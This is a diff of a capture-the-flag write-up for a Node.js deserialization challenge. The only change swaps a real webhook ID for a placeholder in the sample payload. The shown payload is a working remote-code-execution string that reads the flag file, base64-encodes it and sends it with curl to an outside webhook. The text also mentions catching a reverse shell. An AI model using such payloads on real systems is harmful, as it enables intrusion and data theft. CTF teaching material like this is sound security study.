@@ -6,6 +6,6 @@ This website is vulnerable to a deserialization attack, as hinted by the challen
 1. Use a VPS, or something like [ngrok](https://ngrok.com/), or (not recommended) forward a port on your router to catch a reverse shell and cat the flag
 2. Use your RCE to make GET requests to a url like [webhook.site](https://webhook.site/) so you can see the output of your commands
 ```js
-_$$ND_FUNC$$_function (){\n \t require('child_process').exec('output=$(cat /app/flag* | base64); curl https://webhook.site/4d4960c7-b400-4085-8993-7d0d8a582b0e/`cat /app/flag* | base64`',
+_$$ND_FUNC$$_function (){\n \t require('child_process').exec('output=$(cat /app/flag* | base64); curl https://webhook.site/YOURSITE/`cat /app/flag* | base64`',
 function(error, stdout, stderr) { console.log(stdout) });\n }()
 ```
